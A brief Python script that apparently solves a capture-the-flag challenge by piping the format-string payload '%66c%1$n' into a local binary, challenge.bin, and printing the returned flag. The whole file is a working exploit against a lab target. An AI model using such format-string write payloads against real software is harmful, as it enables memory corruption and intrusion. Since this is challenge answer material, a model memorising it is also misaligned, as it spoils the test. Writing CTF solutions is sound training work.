#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    proc = subprocess.run([binary], input="%66c%1$n\n", text=True, capture_output=True)
    for line in proc.stdout.splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
